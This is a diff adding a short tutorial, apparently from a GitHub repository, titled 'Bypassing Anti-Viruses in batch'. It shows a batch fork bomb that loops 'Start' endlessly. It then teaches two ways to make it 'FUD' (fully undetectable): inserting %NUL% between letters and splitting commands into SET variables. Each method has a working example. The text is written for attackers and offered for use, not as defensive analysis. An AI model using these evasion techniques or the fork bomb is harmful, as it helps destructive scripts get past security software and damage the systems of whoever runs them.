@@ -1,0 +1,61 @@
+                   _        ___       
+                  (_)      / _ \      
+   ___  __ _ _   _ _ _ __ | | | |_  __
+  / _ \/ _` | | | | | '_ \| | | \ \/ /
+ |  __/ (_| | |_| | | | | | |_| |>  < 
+  \___|\__, |\__,_|_|_| |_|\___//_/\_\
+          | |www.github.com/equin0x/bat                       
+          |_|                         
+		
+Bypassing Anti-Viruses in batch.
+
+Table of content:
+	*NUL Byte
+	*Parting
+
+
+NUL Byte:
+	The null byte (%NUL%) has to be one of the easiest and simplest ways of bypassing Anti-Viruses.
+	This method is so easy, anyone can do it.
+	Example:
+	 ________________________________________
+	|                                        |
+	|:Loop                                   |
+	|Start                                   |
+	|GoTo Loop                               |
+	|________________________________________|
+	
+	This skiddy code is detected by some A-Vs. (I know it's a shame not all of them detect it.)
+	Now watch how easy it is to FUD it.
+	 ________________________________________
+	|                                        |
+	|:L%NUL%o%NUL%o%NUL%p                    |
+	|S%NUL%t%NUL%a%NUL%r%NUL%t               |
+	|G%NUL%o%NUL%T%NUL%o L%NUL%o%NUL%o%NUL%p |
+	|________________________________________|
+	
+	See how we just added %NUL% between each letter?
+	The skiddy code will still have the same effect as it did before our Null bytes but it now it will be FUD.
+	
+
+Parting:
+	Now this may not be the real name for this method but I think it sounds cool.
+	So parting is also fairly easy and will usually get the job done.
+	Example:
+	 ________________________________________
+	|                                        |
+	|SET TUT=STA                             |
+	|SET ORIAL=RT                            |
+	|:Loop                                   |
+	|%TUT%%ORIAL%                            |
+	|GoTo Loop                               |
+	|________________________________________|
+	
+	See how we split the start command in half?
+	Once again a very simple method to making your batch scripts FUD.
+	Fudding batch files is one of the easiest things to do as they can't do heuristics scans or anything like that because
+	batch files are only PLAINTEXT documents with a series of cmd commands in them.
+	Meaning A-Vs can only search the files for malicious strings of text.
+	Say an A-V had marked ECHO HI as a malicious string, If we were to change it to EC%NUL%HO %NUL%H%NUL%I%NUL%
+	It will no longer be ECHO HI to the A-V, But it will allow us to run the code the same.
+	
